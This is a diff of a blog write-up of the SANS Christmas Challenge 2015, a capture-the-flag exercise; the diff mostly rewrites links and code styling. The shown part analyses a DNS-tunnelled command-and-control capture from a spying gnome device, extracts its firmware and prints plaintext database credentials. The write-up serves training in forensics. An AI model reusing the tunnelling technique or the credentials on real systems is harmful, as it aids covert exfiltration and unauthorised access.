@@ -2,10 +2,10 @@
 <html lang="en">
 <head>
   <link href='//fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,700,400italic' rel='stylesheet' type='text/css'>
-  <link rel="stylesheet" type="text/css" href="../../../../../theme/css/style.min.css">
-  <link rel="stylesheet" type="text/css" href="../../../../../theme/css/pygments.min.css">
-  <link rel="stylesheet" type="text/css" href="../../../../../theme/css/font-awesome.min.css">
-  <link href="../../../../..//extras/style.css" rel="stylesheet">
+  <link rel="stylesheet" type="text/css" href="https://allyourbase.utouch.fr/theme/css/style.min.css">
+  <link rel="stylesheet" type="text/css" href="https://allyourbase.utouch.fr/theme/css/pygments.min.css">
+  <link rel="stylesheet" type="text/css" href="https://allyourbase.utouch.fr/theme/css/font-awesome.min.css">
+  <link href="https://allyourbase.utouch.fr//extras/style.css" rel="stylesheet">
   <link href="https://allyourbase.utouch.fr/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="All Your Base Are Belong To Me Atom">
   <link rel="shortcut icon" href="/extras/favicon.ico" type="image/x-icon">
   <link rel="icon" href="/extras/favicon.ico" type="image/x-icon">
@@ -14,27 +14,27 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <meta name="robots" content="" />
 <meta name="author" content="useless" />
-<meta name="description" content="This year again, the SANS institute delights us with a wonderful Christmas Challenge. We follow the Dosis family, after they purchase a Gnome in Your Home for their kids, Jessica and Joshua. These two kids, especially bright for their age, tinker with the gnome, to find that it has a ..." />
+<meta name="description" content="This year again, the SANS institute delights us with a wonderful Christmas Challenge. We follow the Dosis family, after they purchase a Gnome in Your Home for their kids, Jessica and Joshua. These two kids, especially bright for their age, tinker with the gnome, to find that it has a …" />
 <meta name="keywords" content="">
 <meta property="og:site_name" content="All Your Base Are Belong To Me"/>
 <meta property="og:title" content="SANS Christmas Challenge 2015"/>
-<meta property="og:description" content="This year again, the SANS institute delights us with a wonderful Christmas Challenge. We follow the Dosis family, after they purchase a Gnome in Your Home for their kids, Jessica and Joshua. These two kids, especially bright for their age, tinker with the gnome, to find that it has a ..."/>
+<meta property="og:description" content="This year again, the SANS institute delights us with a wonderful Christmas Challenge. We follow the Dosis family, after they purchase a Gnome in Your Home for their kids, Jessica and Joshua. These two kids, especially bright for their age, tinker with the gnome, to find that it has a …"/>
 <meta property="og:locale" content="en_US"/>
-<meta property="og:url" content="../../../../../posts/2016/01/09/sans-christmas-challenge-2015/"/>
+<meta property="og:url" content="https://allyourbase.utouch.fr/posts/2016/01/09/sans-christmas-challenge-2015/"/>
 <meta property="og:type" content="article"/>
 <meta property="article:published_time" content="2016-01-09 00:00:00+01:00"/>
 <meta property="article:modified_time" content=""/>
-<meta property="article:author" content="../../../../../author/useless.html">
+<meta property="article:author" content="https://allyourbase.utouch.fr/author/useless.html">
 <meta property="article:section" content="Write-up"/>
 <meta property="og:image" content="/images/useless_profile_pic.jpg">  <title>All Your Base Are Belong To Me &ndash; SANS Christmas Challenge 2015</title>
 </head>
 <body>
   <aside>
     <div>
-      <a href="../../../../..">
+      <a href="https://allyourbase.utouch.fr">
         <img src="/images/useless_profile_pic.jpg" alt="All Your Base Are Belong To Me" title="All Your Base Are Belong To Me">
       </a>
-      <h1><a href="../../../../..">All Your Base Are Belong To Me</a></h1>
+      <h1><a href="https://allyourbase.utouch.fr">All Your Base Are Belong To Me</a></h1>
       <p>You know, if that's alright with you</p>
       <nav>
         <ul class="list">
@@ -49,7 +49,7 @@
   </aside>
   <main>
     <nav>
-      <a href="../../../../..">Home</a>
+      <a href="https://allyourbase.utouch.fr">Home</a>
       <a href="/archives.html">Archives</a>
       <a href="/categories.html">Categories</a>
       <a href="https://allyourbase.utouch.fr/feeds/all.atom.xml">Atom</a>
@@ -58,7 +58,7 @@
 <article>
   <header>
     <h1 id="sans-christmas-challenge-2015">SANS Christmas Challenge 2015</h1>
-    <p>Posted on sam. 09 janvier 2016 in <a href="../../../../../category/write-up.html">Write-up</a></p>
+    <p>Posted on sam. 09 janvier 2016 in <a href="https://allyourbase.utouch.fr/category/write-up.html">Write-up</a></p>
   </header>
   <div>
     <img alt="sans_christmas_challenge_2015_logo.png" class="align-center" src="/images/sans-christmas-challenge-2015/sans_christmas_challenge_2015_logo.png" />
@@ -72,8 +72,35 @@ for their age, tinker with the gnome, to find that it has a weird,
 and possible illegal behaviour.</p>
 <p>It all begins when Joshua gives us a capture file of the network
 communications he recorded from the gnome...</p>
+<div class="contents topic" id="table-of-contents">
+<p class="topic-title first">Table of contents</p>
+<ul class="simple">
+<li><a class="reference internal" href="#part-1-dance-of-the-sugar-gnome-fairies-curious-wireless-packets" id="id6">Part 1: Dance of the Sugar Gnome Fairies: <em>Curious Wireless Packets</em></a></li>
+<li><a class="reference internal" href="#part-2-ill-be-gnome-for-christmas-firmware-analysis-for-fun-and-profit" id="id7">Part 2: I’ll be Gnome for Christmas: <em>Firmware Analysis for Fun and Profit</em></a></li>
+<li><a class="reference internal" href="#part-3-let-it-gnome-let-it-gnome-let-it-gnome-internet-wide-scavenger-hunt" id="id8">Part 3: Let it Gnome! Let it Gnome! Let it Gnome! <em>Internet-Wide Scavenger Hunt</em></a></li>
+<li><a class="reference internal" href="#part-4-theres-no-place-like-gnome-for-the-holidays-gnomage-pwnage" id="id9">Part 4: There’s No Place Like Gnome for the Holidays: <em>Gnomage Pwnage</em></a><ul>
+<li><a class="reference internal" href="#id1" id="id10">SuperGnome01</a></li>
+<li><a class="reference internal" href="#id2" id="id11">SuperGnome02</a></li>
+<li><a class="reference internal" href="#id3" id="id12">SuperGnome03</a></li>
+<li><a class="reference internal" href="#id4" id="id13">SuperGnome04</a></li>
+<li><a class="reference internal" href="#id5" id="id14">SuperGnome05</a></li>
+</ul>
+</li>
+<li><a class="reference internal" href="#part-5-baby-its-gnome-outside-sinister-plot-and-attribution" id="id15">Part 5: Baby, It’s Gnome Outside: <em>Sinister Plot and Attribution</em></a><ul>
+<li><a class="reference internal" href="#first-capture-file" id="id16">First capture file</a></li>
+<li><a class="reference internal" href="#second-capture-file" id="id17">Second capture file</a></li>
+<li><a class="reference internal" href="#third-capture-file" id="id18">Third capture file</a></li>
+<li><a class="reference internal" href="#fourth-capture-file" id="id19">Fourth capture file</a></li>
+<li><a class="reference internal" href="#fifth-capture-file" id="id20">Fifth capture file</a></li>
+<li><a class="reference internal" href="#let-s-unxor-the-images" id="id21">Let's unXOR the images</a></li>
+</ul>
+</li>
+<li><a class="reference internal" href="#epilogue-twas-the-gnome-before-christmas-wrapping-it-all-up" id="id22">Epilogue: ‘Twas the Gnome Before Christmas: <em>Wrapping It All Up</em></a></li>
+<li><a class="reference internal" href="#conclusion" id="id23">Conclusion</a></li>
+</ul>
+</div>
 <div class="section" id="part-1-dance-of-the-sugar-gnome-fairies-curious-wireless-packets">
-<h2>Part 1: Dance of the Sugar Gnome Fairies: <em>Curious Wireless Packets</em></h2>
+<h2><a class="toc-backref" href="#id6">Part 1: Dance of the Sugar Gnome Fairies: <em>Curious Wireless Packets</em></a></h2>
 <p>We're given a <a class="reference external" href="/docs/sans-christmas-challenge-2015/giyh-capture.pcap">PCAP file</a> (sha256:
 <code>655541fb645af45db68a739066325e2f1138812a6893254ae7b48acd9519a330</code>),
 and are asked to analyze it, to see what we can find.  If we open it with
@@ -84,55 +111,55 @@ like base64-encoded data in the TXT fields.</p>
 is a well known trick to bypass traffic filtering, because outbound DNS is
 often authorized on a local network. So, let's extract and decode the TXT
 fields. tshark is particularly adapted for this task:</p>
-<div class="highlight"><pre><span class="nv">$ </span>tshark -r giyh-capture.pcap -Y dns -T fields -e dns.txt <span class="p">|</span> base64 -d &gt; giyh-capture_decoded.txt
+<div class="highlight"><pre><span></span><span class="gp">$</span> tshark -r giyh-capture.pcap -Y dns -T fields -e dns.txt <span class="p">|</span> base64 -d &gt; giyh-capture_decoded.txt
 </pre></div>
 <p>Here, we ask tshark to focus on the DNS traffic, and to output only the TXT
 fields. Now, let's take a look at the decoded file:</p>
-<div class="highlight"><pre><span class="nv">$ </span>cat giyh-capture_decoded.txt
-NONE:NONE:NONE:NONE:NONE:NONE:NONE:EXEC:iwconfig
-EXEC:START_STATEEXEC:wlan0     IEEE 802.11abgn  ESSID:<span class="s2">&quot;DosisHome-Guest&quot;</span>
-EXEC:          Mode:Managed  Frequency:2.412 GHz  Cell: 7A:B3:B6:5E:A4:3F
-EXEC:          Tx-Power<span class="o">=</span><span class="m">20</span> dBm
-EXEC:          Retry short limit:7   RTS thr:off   Fragment thr:off
-EXEC:          Encryption key:off
-EXEC:          Power Management:off
-EXEC:
-EXEC:lo        no wireless extensions.
-EXEC:
-EXEC:eth0      no wireless extensions.
-EXEC:STOP_STATENONE:NONE:NONE:EXEC:cat /tmp/iwlistscan.txt
-EXEC:START_STATEEXEC:wlan0     Scan completed :
-EXEC:          Cell <span class="m">01</span> - Address: 00:7F:28:35:9A:C7
-EXEC:                    Channel:1
-EXEC:                    Frequency:2.412 GHz <span class="o">(</span>Channel 1<span class="o">)</span>
-EXEC:                    <span class="nv">Quality</span><span class="o">=</span>29/70  Signal <span class="nv">level</span><span class="o">=</span>-81 dBm
-EXEC:                    Encryption key:on
-EXEC:                    ESSID:<span class="s2">&quot;CHC&quot;</span>
-EXEC:                    Bit Rates:1 Mb/s<span class="p">;</span> <span class="m">2</span> Mb/s<span class="p">;</span> 5.5 Mb/s<span class="p">;</span> <span class="m">11</span> Mb/s<span class="p">;</span> <span class="m">6</span> Mb/s
-EXEC:                              <span class="m">9</span> Mb/s<span class="p">;</span> <span class="m">12</span> Mb/s<span class="p">;</span> <span class="m">18</span> Mb/s
-EXEC:                    Bit Rates:24 Mb/s<span class="p">;</span> <span class="m">36</span> Mb/s<span class="p">;</span> <span class="m">48</span> Mb/s<span class="p">;</span> <span class="m">54</span> Mb/s
-EXEC:                    Mode:Master
-EXEC:                    Extra:tsf<span class="o">=</span>000000412e67cddf
-EXEC:                    Extra: Last beacon: 5408ms ago
-EXEC:                    IE: Unknown: 00055837335A36
-EXEC:                    IE: Unknown: 010882848B960C121824
-EXEC:                    IE: Unknown: 030101
-EXEC:                    IE: Unknown: 200100
-EXEC:                    IE: IEEE 802.11i/WPA2 Version 1
-EXEC:                        Group Cipher : CCMP
-EXEC:                        Pairwise Ciphers <span class="o">(</span>1<span class="o">)</span> : CCMP
-EXEC:                        Authentication Suites <span class="o">(</span>1<span class="o">)</span> : PSK
-EXEC:                    IE: Unknown: 2A0100
-EXEC:                    IE: Unknown: 32043048606C
-EXEC:                    IE: Unknown: DD180050F2020101040003A4000027A4000042435E0062322F00
-EXEC:                    IE: Unknown: 2D1A8C131BFFFF000000000000000000000000000000000000000000
-EXEC:                    IE: Unknown: 3D1601080800000000000000000000000000000000000000
-EXEC:                    IE: Unknown: DD0900037F01010000FF7F
-EXEC:                    IE: Unknown: DD0A00037F04010000000000
-EXEC:                    IE: Unknown: 0706555320010B1B
-<span class="o">[</span>snip<span class="o">]</span>
-EXEC:STOP_STATENONE:NONE:NONE:NONE:FILE:/root/Pictures/snapshot_CURRENT.jpg
-FILE:START_STATE,NAME<span class="o">=</span>/root/Pictures/snapshot_CURRENT.jpgFILE:<span class="se">\x</span>FF<span class="se">\x</span>D8<span class="se">\x</span>FF<span class="se">\x</span>E0<span class="se">\x</span>00<span class="se">\x</span>10JFIF<span class="o">[</span>raw binary<span class="o">]</span>
+<div class="highlight"><pre><span></span><span class="gp">$</span> cat giyh-capture_decoded.txt
+<span class="go">NONE:NONE:NONE:NONE:NONE:NONE:NONE:EXEC:iwconfig</span>
+<span class="go">EXEC:START_STATEEXEC:wlan0     IEEE 802.11abgn  ESSID:&quot;DosisHome-Guest&quot;</span>
+<span class="go">EXEC:          Mode:Managed  Frequency:2.412 GHz  Cell: 7A:B3:B6:5E:A4:3F</span>
+<span class="go">EXEC:          Tx-Power=20 dBm</span>
+<span class="go">EXEC:          Retry short limit:7   RTS thr:off   Fragment thr:off</span>
+<span class="go">EXEC:          Encryption key:off</span>
+<span class="go">EXEC:          Power Management:off</span>
+<span class="go">EXEC:</span>
+<span class="go">EXEC:lo        no wireless extensions.</span>
+<span class="go">EXEC:</span>
+<span class="go">EXEC:eth0      no wireless extensions.</span>
+<span class="go">EXEC:STOP_STATENONE:NONE:NONE:EXEC:cat /tmp/iwlistscan.txt</span>
+<span class="go">EXEC:START_STATEEXEC:wlan0     Scan completed :</span>
+<span class="go">EXEC:          Cell 01 - Address: 00:7F:28:35:9A:C7</span>
+<span class="go">EXEC:                    Channel:1</span>
+<span class="go">EXEC:                    Frequency:2.412 GHz (Channel 1)</span>
+<span class="go">EXEC:                    Quality=29/70  Signal level=-81 dBm</span>
+<span class="go">EXEC:                    Encryption key:on</span>
+<span class="go">EXEC:                    ESSID:&quot;CHC&quot;</span>
+<span class="go">EXEC:                    Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 6 Mb/s</span>
+<span class="go">EXEC:                              9 Mb/s; 12 Mb/s; 18 Mb/s</span>
+<span class="go">EXEC:                    Bit Rates:24 Mb/s; 36 Mb/s; 48 Mb/s; 54 Mb/s</span>
+<span class="go">EXEC:                    Mode:Master</span>
+<span class="go">EXEC:                    Extra:tsf=000000412e67cddf</span>
+<span class="go">EXEC:                    Extra: Last beacon: 5408ms ago</span>
+<span class="go">EXEC:                    IE: Unknown: 00055837335A36</span>
+<span class="go">EXEC:                    IE: Unknown: 010882848B960C121824</span>
+<span class="go">EXEC:                    IE: Unknown: 030101</span>
+<span class="go">EXEC:                    IE: Unknown: 200100</span>
+<span class="go">EXEC:                    IE: IEEE 802.11i/WPA2 Version 1</span>
+<span class="go">EXEC:                        Group Cipher : CCMP</span>
+<span class="go">EXEC:                        Pairwise Ciphers (1) : CCMP</span>
+<span class="go">EXEC:                        Authentication Suites (1) : PSK</span>
+<span class="go">EXEC:                    IE: Unknown: 2A0100</span>
+<span class="go">EXEC:                    IE: Unknown: 32043048606C</span>
+<span class="go">EXEC:                    IE: Unknown: DD180050F2020101040003A4000027A4000042435E0062322F00</span>
+<span class="go">EXEC:                    IE: Unknown: 2D1A8C131BFFFF000000000000000000000000000000000000000000</span>
+<span class="go">EXEC:                    IE: Unknown: 3D1601080800000000000000000000000000000000000000</span>
+<span class="go">EXEC:                    IE: Unknown: DD0900037F01010000FF7F</span>
+<span class="go">EXEC:                    IE: Unknown: DD0A00037F04010000000000</span>
+<span class="go">EXEC:                    IE: Unknown: 0706555320010B1B</span>
+<span class="go">[snip]</span>
+<span class="go">EXEC:STOP_STATENONE:NONE:NONE:NONE:FILE:/root/Pictures/snapshot_CURRENT.jpg</span>
+<span class="go">FILE:START_STATE,NAME=/root/Pictures/snapshot_CURRENT.jpgFILE:\xFF\xD8\xFF\xE0\x00\x10JFIF[raw binary]</span>
 </pre></div>
 <p>Ok, lots of stuff! We can see that some shell commands are executed, and there
 seems to be the upload of a JPEG file. The commands and results seem to be
@@ -143,12 +170,12 @@ configuration of the different wirelass network interfaces of the gnome, and
 <code>cat /tmp/iwlistscan.txt</code>, which seems to give the result of the
 <code>iwlist scan</code> command, which scans available wireless networks.</p>
 <p>We can recover the content of the uploaded file, with the following commands:</p>
-<div class="highlight"><pre><span class="nv">$ </span>binwalk giyh-capture_decoded.txt <span class="c"># binwalk gives us the offset at which the JPEG file starts</span>
+<div class="highlight"><pre><span></span><span class="gp">$</span> binwalk giyh-capture_decoded.txt <span class="c1"># binwalk gives us the offset at which the JPEG file starts</span>
 
-DECIMAL       HEXADECIMAL     DESCRIPTION
---------------------------------------------------------------------------------
-<span class="m">4495</span>          0x118F          JPEG image data, JFIF standard  1.01
-<span class="nv">$ </span>dd <span class="nv">bs</span><span class="o">=</span><span class="m">1</span> <span class="nv">skip</span><span class="o">=</span><span class="m">4495</span> <span class="k">if</span><span class="o">=</span>giyh-capture_decoded.txt <span class="p">|</span> sed <span class="s1">&#39;s/FILE://g&#39;</span> &gt; giyh-capture_image.jpg <span class="c"># we skip the beginning of the decoded file, and remove the &quot;FILE:&quot; string from the result</span>
+<span class="go">DECIMAL       HEXADECIMAL     DESCRIPTION</span>
+<span class="go">--------------------------------------------------------------------------------</span>
+<span class="go">4495          0x118F          JPEG image data, JFIF standard  1.01</span>
+<span class="gp">$</span> dd <span class="nv">bs</span><span class="o">=</span><span class="m">1</span> <span class="nv">skip</span><span class="o">=</span><span class="m">4495</span> <span class="k">if</span><span class="o">=</span>giyh-capture_decoded.txt <span class="p">|</span> sed <span class="s1">&#39;s/FILE://g&#39;</span> &gt; giyh-capture_image.jpg <span class="c1"># we skip the beginning of the decoded file, and remove the &quot;FILE:&quot; string from the result</span>
 </pre></div>
 <p>We get the following image:</p>
 <img alt="giyh-capture_image.jpg" class="align-center" src="/images/sans-christmas-challenge-2015/giyh-capture_image.jpg" />
@@ -156,94 +183,94 @@ DECIMAL       HEXADECIMAL     DESCRIPTION
 <img alt="first_flag_confirmation" class="align-center" src="/images/sans-christmas-challenge-2015/first_flag_confirmation.png" />
 </div>
 <div class="section" id="part-2-ill-be-gnome-for-christmas-firmware-analysis-for-fun-and-profit">
-<h2>Part 2: I’ll be Gnome for Christmas: <em>Firmware Analysis for Fun and Profit</em></h2>
+<h2><a class="toc-backref" href="#id7">Part 2: I’ll be Gnome for Christmas: <em>Firmware Analysis for Fun and Profit</em></a></h2>
 <p>After seeing such a strange and creepy behaviour (come on, man, you're taking
 pictures of little kids' bedrooms), we are asked to analyze the firmware of
 the gnome.</p>
 <p>We recover the <a class="reference external" href="/docs/sans-christmas-challenge-2015/giyh-firmware-dump.bin">firmware</a> (sha256:
 <code>bee93a79bb8ee2eba526494b4e6e56a601e1fa9589a1cccf7bfe61261ab8db20</code>) from
 Jessica. Now, time to analyze it! The best tool I know for file analysis is binwalk:</p>
-<div class="highlight"><pre><span class="nv">$ </span>binwalk giyh-firmware-dump.bin
+<div class="highlight"><pre><span></span><span class="gp">$</span> binwalk giyh-firmware-dump.bin
 
-DECIMAL       HEXADECIMAL     DESCRIPTION
---------------------------------------------------------------------------------
-<span class="m">0</span>             0x0             PEM certificate
-<span class="m">1809</span>          0x711           ELF 32-bit LSB shared object, ARM, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>
-<span class="m">168803</span>        0x29363         Squashfs filesystem, little endian, version 4.0, compression:gzip, size: <span class="m">17376149</span> bytes,  <span class="m">4866</span> inodes, blocksize: <span class="m">131072</span> bytes, created: Tue Dec  <span class="m">8</span> 19:47:32 2015
+<span class="go">DECIMAL       HEXADECIMAL     DESCRIPTION</span>
+<span class="go">--------------------------------------------------------------------------------</span>
+<span class="go">0             0x0             PEM certificate</span>
+<span class="go">1809          0x711           ELF 32-bit LSB shared object, ARM, version 1 (SYSV)</span>
+<span class="go">168803        0x29363         Squashfs filesystem, little endian, version 4.0, compression:gzip, size: 17376149 bytes,  4866 inodes, blocksize: 131072 bytes, created: Tue Dec  8 19:47:32 2015</span>
 </pre></div>
 <p>Using the <code>-e</code> option form binwalk, we can extract the different files,
 and unsquash the file system, to get a browsable version of the file system:</p>
-<div class="highlight"><pre><span class="nv">$ </span>binwalk -e giyh-firmware-dump.bin
+<div class="highlight"><pre><span></span><span class="gp">$</span> binwalk -e giyh-firmware-dump.bin
 
-DECIMAL       HEXADECIMAL     DESCRIPTION
---------------------------------------------------------------------------------
-<span class="m">0</span>             0x0             PEM certificate
-<span class="m">1809</span>          0x711           ELF 32-bit LSB shared object, ARM, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>
-<span class="m">168803</span>        0x29363         Squashfs filesystem, little endian, version 4.0, compression:gzip, size: <span class="m">17376149</span> bytes,  <span class="m">4866</span> inodes, blocksize: <span class="m">131072</span> bytes, created: Tue Dec  <span class="m">8</span> 19:47:32 2015
-<span class="nv">$ </span><span class="nb">cd </span>_giyh-firmware-dump.bin.extracted/squashfs-root
-<span class="nv">$ </span>ls
-bin  etc  init  lib  mnt  opt  overlay  rom  root  sbin  tmp  usr  var  www
-<span class="nv">$ </span>cat etc/banner
-  _______                     ________        __
- <span class="p">|</span>       <span class="p">|</span>.-----.-----.-----.<span class="p">|</span>  <span class="p">|</span>  <span class="p">|</span>  <span class="p">|</span>.----.<span class="p">|</span>  <span class="p">|</span>_
- <span class="p">|</span>   -   <span class="o">||</span>  _  <span class="p">|</span>  -__<span class="p">|</span>     <span class="o">||</span>  <span class="p">|</span>  <span class="p">|</span>  <span class="o">||</span>   _<span class="o">||</span>   _<span class="p">|</span>
- <span class="p">|</span>_______<span class="o">||</span>   __<span class="p">|</span>_____<span class="p">|</span>__<span class="p">|</span>__<span class="o">||</span>________<span class="o">||</span>__<span class="p">|</span>  <span class="p">|</span>____<span class="p">|</span>
-          <span class="p">|</span>__<span class="p">|</span> W I R E L E S S   F R E E D O M
- -----------------------------------------------------
- DESIGNATED DRIVER <span class="o">(</span>Bleeding Edge, r47650<span class="o">)</span>
- -----------------------------------------------------
-  * <span class="m">2</span> oz. Orange Juice         Combine all juices in a
-  * <span class="m">2</span> oz. Pineapple Juice      tall glass filled with
-  * <span class="m">2</span> oz. Grapefruit Juice     ice, stir well.
-  * <span class="m">2</span> oz. Cranberry Juice
- -----------------------------------------------------
+<span class="go">DECIMAL       HEXADECIMAL     DESCRIPTION</span>
+<span class="go">--------------------------------------------------------------------------------</span>
+<span class="go">0             0x0             PEM certificate</span>
+<span class="go">1809          0x711           ELF 32-bit LSB shared object, ARM, version 1 (SYSV)</span>
+<span class="go">168803        0x29363         Squashfs filesystem, little endian, version 4.0, compression:gzip, size: 17376149 bytes,  4866 inodes, blocksize: 131072 bytes, created: Tue Dec  8 19:47:32 2015</span>
+<span class="gp">$</span> <span class="nb">cd</span> _giyh-firmware-dump.bin.extracted/squashfs-root
+<span class="gp">$</span> ls
+<span class="go">bin  etc  init  lib  mnt  opt  overlay  rom  root  sbin  tmp  usr  var  www</span>
+<span class="gp">$</span> cat etc/banner
+<span class="go">  _______                     ________        __</span>
+<span class="go"> |       |.-----.-----.-----.|  |  |  |.----.|  |_</span>
+<span class="go"> |   -   ||  _  |  -__|     ||  |  |  ||   _||   _|</span>
+<span class="go"> |_______||   __|_____|__|__||________||__|  |____|</span>
+<span class="go">          |__| W I R E L E S S   F R E E D O M</span>
+<span class="go"> -----------------------------------------------------</span>
+<span class="go"> DESIGNATED DRIVER (Bleeding Edge, r47650)</span>
+<span class="go"> -----------------------------------------------------</span>
+<span class="go">  * 2 oz. Orange Juice         Combine all juices in a</span>
+<span class="go">  * 2 oz. Pineapple Juice      tall glass filled with</span>
+<span class="go">  * 2 oz. Grapefruit Juice     ice, stir well.</span>
+<span class="go">  * 2 oz. Cranberry Juice</span>
+<span class="go"> -----------------------------------------------------</span>
 </pre></div>
 <p>We can see that the firmware is based on OpenWRT, more specifically the
 Designated Driver branch, which is the development branch. We can find
 the architecture by looking at some binary files in the <code>bin</code> folder:</p>
-<div class="highlight"><pre><span class="nv">$ </span>file bin/ash
-bin/ash: ELF 32-bit LSB executable, ARM, EABI5 version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib/ld-musl-armhf.so.1, stripped
+<div class="highlight"><pre><span></span><span class="gp">$</span> file bin/ash
+<span class="go">bin/ash: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-musl-armhf.so.1, stripped</span>
 </pre></div>
 <p>The architecture of the gnome seems to be 32-bit ARM.</p>
 <p>We can see a <code>www</code> folder at the root of the file system. Let's take a
 look at it:</p>
-<div class="highlight"><pre><span class="nv">$ </span>ls
-app.js  bin  files  node_modules  package.json  public  routes  views
-<span class="nv">$ </span>ls views
-cameras.jade  error.jade  files.jade  gnomenet.jade  index.jade  layout.jade  login.jade  network.jade  settings.jade
+<div class="highlight"><pre><span></span><span class="gp">$</span> ls
+<span class="go">app.js  bin  files  node_modules  package.json  public  routes  views</span>
+<span class="gp">$</span> ls views
+<span class="go">cameras.jade  error.jade  files.jade  gnomenet.jade  index.jade  layout.jade  login.jade  network.jade  settings.jade</span>
 </pre></div>
 <p>The embedded web site seems to be a NodeJS website, using the Jade Node
 Template Engine.</p>
-<div class="highlight"><pre><span class="nv">$ </span>head app.js
-var <span class="nv">express</span> <span class="o">=</span> require<span class="o">(</span><span class="s1">&#39;express&#39;</span><span class="o">)</span><span class="p">;</span>
-var <span class="nv">path</span> <span class="o">=</span> require<span class="o">(</span><span class="s1">&#39;path&#39;</span><span class="o">)</span><span class="p">;</span>
-var <span class="nv">favicon</span> <span class="o">=</span> require<span class="o">(</span><span class="s1">&#39;serve-favicon&#39;</span><span class="o">)</span><span class="p">;</span>
-var <span class="nv">logger</span> <span class="o">=</span> require<span class="o">(</span><span class="s1">&#39;morgan&#39;</span><span class="o">)</span><span class="p">;</span>
-var <span class="nv">cookieParser</span> <span class="o">=</span> require<span class="o">(</span><span class="s1">&#39;cookie-parser&#39;</span><span class="o">)</span><span class="p">;</span>
-var <span class="nv">bodyParser</span> <span class="o">=</span> require<span class="o">(</span><span class="s1">&#39;body-parser&#39;</span><span class="o">)</span><span class="p">;</span>
-var <span class="nv">routes</span> <span class="o">=</span> require<span class="o">(</span><span class="s1">&#39;./routes/index&#39;</span><span class="o">)</span><span class="p">;</span>
-var <span class="nv">mongo</span> <span class="o">=</span> require<span class="o">(</span><span class="s1">&#39;mongodb&#39;</span><span class="o">)</span><span class="p">;</span>
-var <span class="nv">monk</span> <span class="o">=</span> require<span class="o">(</span><span class="s1">&#39;monk&#39;</span><span class="o">)</span><span class="p">;</span>
-var <span class="nv">db</span> <span class="o">=</span> monk<span class="o">(</span><span class="s1">&#39;gnome:KTt9C1SljNKDiobKKro926frc@localhost:27017/gnome&#39;</span><span class="o">)</span>
+<div class="highlight"><pre><span></span><span class="gp">$</span> head app.js
+<span class="go">var express = require(&#39;express&#39;);</span>
+<span class="go">var path = require(&#39;path&#39;);</span>
+<span class="go">var favicon = require(&#39;serve-favicon&#39;);</span>
+<span class="go">var logger = require(&#39;morgan&#39;);</span>
+<span class="go">var cookieParser = require(&#39;cookie-parser&#39;);</span>
+<span class="go">var bodyParser = require(&#39;body-parser&#39;);</span>
+<span class="go">var routes = require(&#39;./routes/index&#39;);</span>
+<span class="go">var mongo = require(&#39;mongodb&#39;);</span>
+<span class="go">var monk = require(&#39;monk&#39;);</span>
+<span class="go">var db = monk(&#39;gnome:KTt9C1SljNKDiobKKro926frc@localhost:27017/gnome&#39;)</span>
 </pre></div>
 <p>We can see that the web site uses MongoDB as the database management system. We
 can find the MongoDB files in the squashfs-root/opt/mongodb directory. Let's
 copy them to a local install of MongoDB so that we can analyze them:</p>
-<div class="highlight"><pre><span class="nv">$ </span>sudo cp squashfs-root/opt/mongodb/gnome.* /var/lib/mongodb
-<span class="nv">$ </span>sudo chown mongodb:nogroup /var/lib/mongodb/gnome.*
-<span class="nv">$ </span>sudo service mongodb start
-<span class="nv">$ </span>mongo gnome
-MongoDB shell version: 2.4.10
-connecting to: gnome
-&gt; show collections
-cameras
-settings
-status
-system.indexes
-users
-&gt; db.users.find<span class="o">()</span>
-<span class="o">{</span> <span class="s2">&quot;_id&quot;</span> : ObjectId<span class="o">(</span><span class="s2">&quot;56229f58809473d11033515b&quot;</span><span class="o">)</span>, <span class="s2">&quot;username&quot;</span> : <span class="s2">&quot;user&quot;</span>, <span class="s2">&quot;password&quot;</span> : <span class="s2">&quot;user&quot;</span>, <span class="s2">&quot;user_level&quot;</span> : <span class="m">10</span> <span class="o">}</span>
-<span class="o">{</span> <span class="s2">&quot;_id&quot;</span> : ObjectId<span class="o">(</span><span class="s2">&quot;56229f63809473d11033515c&quot;</span><span class="o">)</span>, <span class="s2">&quot;username&quot;</span> : <span class="s2">&quot;admin&quot;</span>, <span class="s2">&quot;password&quot;</span> : <span class="s2">&quot;SittingOnAShelf&quot;</span>, <span class="s2">&quot;user_level&quot;</span> : <span class="m">100</span> <span class="o">}</span>
+<div class="highlight"><pre><span></span><span class="gp">$</span> sudo cp squashfs-root/opt/mongodb/gnome.* /var/lib/mongodb
+<span class="gp">$</span> sudo chown mongodb:nogroup /var/lib/mongodb/gnome.*
+<span class="gp">$</span> sudo service mongodb start
+<span class="gp">$</span> mongo gnome
+<span class="go">MongoDB shell version: 2.4.10</span>
+<span class="go">connecting to: gnome</span>
+<span class="gp">&gt;</span> show collections
+<span class="go">cameras</span>
+<span class="go">settings</span>
+<span class="go">status</span>
+<span class="go">system.indexes</span>
+<span class="go">users</span>
+<span class="gp">&gt;</span> db.users.find<span class="o">()</span>
+<span class="go">{ &quot;_id&quot; : ObjectId(&quot;56229f58809473d11033515b&quot;), &quot;username&quot; : &quot;user&quot;, &quot;password&quot; : &quot;user&quot;, &quot;user_level&quot; : 10 }</span>
+<span class="go">{ &quot;_id&quot; : ObjectId(&quot;56229f63809473d11033515c&quot;), &quot;username&quot; : &quot;admin&quot;, &quot;password&quot; : &quot;SittingOnAShelf&quot;, &quot;user_level&quot; : 100 }</span>
 </pre></div>
 <p>We can see that the credentials are stored in plaintext, which is a big no-no.
 The credentials to connect to the gnome web interface as an administrator are
@@ -252,7 +279,7 @@ The credentials to connect to the gnome web interface as an administrator are
 <img alt="second_flag_confirmation" class="align-center" src="/images/sans-christmas-challenge-2015/second_flag_confirmation.png" />
 </div>
 <div class="section" id="part-3-let-it-gnome-let-it-gnome-let-it-gnome-internet-wide-scavenger-hunt">
-<h2>Part 3: Let it Gnome! Let it Gnome! Let it Gnome! <em>Internet-Wide Scavenger Hunt</em></h2>
+<h2><a class="toc-backref" href="#id8">Part 3: Let it Gnome! Let it Gnome! Let it Gnome! <em>Internet-Wide Scavenger Hunt</em></a></h2>
